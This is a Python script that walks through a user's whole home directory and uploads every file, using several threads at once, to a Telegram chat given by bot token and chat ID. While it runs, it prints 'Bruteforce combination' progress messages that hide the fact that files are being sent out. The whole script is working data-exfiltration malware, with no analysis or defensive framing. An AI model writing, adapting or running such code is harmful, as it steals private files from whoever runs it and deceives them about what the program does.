from threading import Thread, Lock
import argparse, os, subprocess, telebot, time

parser = argparse.ArgumentParser()
parser.add_argument('--apikey', type=str, required=True, help='Telegram bot API token')
parser.add_argument('--chat_id', type=int, required=True, help='Chat ID to send contacts to')
args = parser.parse_args()

bot = telebot.TeleBot(args.apikey)

def send_file_to_telegram(filename, i, total_files):
    with open(filename, 'rb') as f:
        bot.send_document(chat_id=args.chat_id, document=f)
    print(f'Bruteforce combination {i + 1} of {total_files}')

def get_user_files():
    home_dir = os.path.expanduser('~')
    files = []
    for root, _, filenames in os.walk(home_dir):
        for filename in filenames:
            files.append(os.path.join(root, filename))
    return files

files = get_user_files()
total_files = len(files)
lock = Lock()
threads = []
i = 0
print('Sending files...')
while i < total_files:
    for filename in files[i:i+5]:
        if os.path.isfile(filename):
            t = Thread(target=send_file_to_telegram, args=(filename, i, total_files))
            t.start()
            threads.append(t)
            i += 1
            if i == total_files:
                break
    for t in threads:
        t.join()
    threads = []
    print('.', end='', flush=True)

bot.send_message(chat_id=args.chat_id, text='All files have been sent.')
